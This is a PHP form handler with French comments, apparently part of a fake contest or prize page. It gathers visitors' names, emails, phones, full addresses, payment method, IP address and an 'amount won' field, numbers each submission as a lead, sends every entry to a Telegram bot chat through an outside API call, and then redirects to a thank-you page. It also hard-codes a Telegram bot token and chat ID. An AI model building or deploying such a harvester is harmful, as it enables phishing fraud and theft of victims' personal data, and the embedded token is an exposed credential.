<?php
// ===============================
//  Telegram Handler for Concours
//  Version compatible PHP 5.x
// ===============================

// // Décommentez ces lignes si vous voulez voir les erreurs PHP (debug)
// // error_reporting(E_ALL);
// // ini_set('display_errors', 1);

// Config Telegram
$botToken = '6417708035:AAGQ0w-ryvgMcp9QmUMeB1wbfbGu69ngY_c';
$chatId   = '5061239044'; // ID perso ou ID groupe/canal

// IP du visiteur
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'inconnue';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] . ' (proxy: ' . $ip . ')';
}

// Récupération sécurisée des champs du formulaire
$fullName  = isset($_POST['fullName'])  ? $_POST['fullName']  : '';
$email     = isset($_POST['email'])     ? $_POST['email']     : '';
$phone     = isset($_POST['phone'])     ? $_POST['phone']     : '';
$address   = isset($_POST['address'])   ? $_POST['address']   : '';
$method    = isset($_POST['method'])    ? $_POST['method']    : '';
$bonus     = isset($_POST['bonus'])     ? $_POST['bonus']     : '';
$country   = isset($_POST['country'])   ? $_POST['country']   : '';
$subdomain = isset($_POST['subdomain']) ? $_POST['subdomain'] : '';
$city      = isset($_POST['city'])      ? $_POST['city']      : '';
$postal    = isset($_POST['postal'])    ? $_POST['postal']    : '';

// Numérotation des formulaires envoyés
$leadNumberFile = __DIR__ . '/leads-counter.txt';
$leadNumber = 1;
if (file_exists($leadNumberFile)) {
    $leadNumber = (int)file_get_contents($leadNumberFile) + 1;
}
file_put_contents($leadNumberFile, (string)$leadNumber);

// Message envoyé sur Telegram
$message  = "📨 Nouveau formulaire (#" . $leadNumber . ")\n\n";
$message .= "👤 Nom : " . $fullName . "\n";
$message .= "📧 Email : " . $email . "\n";
$message .= "📱 Téléphone : " . $phone . "\n";
$message .= "🏠 Adresse complète : " . $address . "\n";
$message .= "🏙️ Ville : " . $city . "\n";
$message .= "📮 Code postal : " . $postal . "\n";
$message .= "💳 Méthode de paiement : " . $method . "\n";
$message .= "💰 Montant gagné : €" . $bonus . "\n";
$message .= "🌍 Pays : " . $country . "\n";
$message .= "🧩 Subdomain : " . $subdomain . "\n";
$message .= "💻 IP : " . $ip . "\n";

$telegramUrl = "https://api.telegram.org/bot" . $botToken . "/sendMessage";

$data = array(
    'chat_id'    => $chatId,
    'text'       => $message,
    'parse_mode' => 'Markdown'
);

$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
        'timeout' => 10
    )
);

$context  = stream_context_create($options);
$result   = @file_get_contents($telegramUrl, false, $context);

// Redirection vers une page de remerciement
header('Location: thankyou.html');
exit;
?>
